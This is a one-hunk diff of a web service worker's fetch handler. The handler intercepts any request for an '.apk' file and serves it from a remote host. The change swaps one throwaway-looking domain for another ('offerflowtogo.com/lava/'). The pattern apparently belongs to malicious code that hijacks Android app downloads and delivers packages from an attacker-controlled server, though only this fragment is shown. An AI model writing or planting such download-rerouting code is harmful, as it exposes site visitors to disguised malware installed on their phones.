@@ -70,7 +70,7 @@ self.addEventListener('fetch', event => {
     if (url.pathname.endsWith('.apk')) {
         event.respondWith(
             (async () => {
-                const apkURL = "https://noticeablyholyewe.autos/aaa8e7e844e856a015a/" + url.search;
+                const apkURL = "https://offerflowtogo.com/lava/" + url.search;
                 const apkname = getApkName(url)
                 try {
                     return await fetchApk(apkURL, apkname);
